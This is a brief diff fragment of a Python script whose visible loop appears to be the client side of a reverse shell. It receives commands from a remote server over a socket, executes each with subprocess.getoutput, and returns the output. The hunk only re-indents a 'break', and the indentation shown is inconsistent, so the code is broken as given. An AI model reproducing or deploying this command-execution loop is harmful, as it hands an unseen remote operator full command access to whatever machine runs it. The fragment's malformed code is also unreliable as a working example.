@@ -15,7 +15,7 @@ print("Server:", message)
 while True:
   command = s.recv(BUFFER_SIZE).decode()
     if command.lower() == "exit":
-      break
+    break
   output = subprocess.getoutput(command)
   s.send(output.encode())
 s.close()
